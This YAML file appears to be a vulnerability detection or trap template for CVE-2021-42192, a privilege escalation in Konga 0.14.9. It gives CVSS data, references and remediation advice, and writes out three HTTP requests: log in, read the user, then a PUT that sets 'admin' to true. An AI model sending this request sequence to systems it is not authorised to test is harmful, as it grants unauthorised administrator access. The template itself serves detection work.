id: CVE-2021-42192
info:
  name: KONGA 0.14.9 - Privilege Escalation
  author: rschio
  description: KONGA 0.14.9 allows attackers to set higher privilege users to full
    administration access. The attack vector is a crafted condition, as demonstrated
    by the /api/user/{ID} at ADMIN parameter.
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    escalate their privileges and gain unauthorized access to sensitive information
    or perform unauthorized actions.

    '
  remediation: 'Upgrade to a patched version of KONGA or apply the necessary security
    patches provided by the vendor.

    '
  reference:
  - http://n0hat.blogspot.com/2021/11/konga-0149-privilege-escalation-exploit.html
  - https://www.exploit-db.com/exploits/50521
  - hhttps://nvd.nist.gov/vuln/detail/CVE-2021-42192
  - https://docs.google.com/document/d/1-YU9zWiDVUps3Mb6zos3996yvZ48vW_vfOvaJLLHc4I/edit?usp=sharing
  - https://github.com/pantsel/konga/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-42192
    cwe-id: CWE-863
    epss-score: 0.04146
    epss-percentile: 0.91987
    cpe: cpe:2.3:a:konga_project:konga:0.14.9:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: konga_project
    product: konga
  tags: cve2021,cve,authenticated,edb,konga,intrusive,konga_project
traps:
- request:
    method: POST
    path: /login
    headers:
      Content-Type: application/json
    body: '{"password": "{{password}}", "identifier": "{{username}}"}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /api/user/
    headers:
      Origin: '{{BaseURL}}'
      Referer: '{{BaseURL}}'
      Content-Type: application/json;charset=utf-8
    body: '{"token": "{{token}}"}

      '
  response:
    status_code: 200
    headers: {}
    body: '"admin":false'
- request:
    method: PUT
    path: /api/user/
    headers:
      Origin: '{{BaseURL}}'
      Referer: '{{BaseURL}}'
      Content-Type: application/json;charset=utf-8
    body: '{"admin": "true", "passports": {"password": "{{password}}", "protocol":
      "local"}, "token": "{{token}}", "password_confirmation": "{{password}}"}

      '
  response:
    status_code: 200
    headers: {}
    body: '"admin":true'
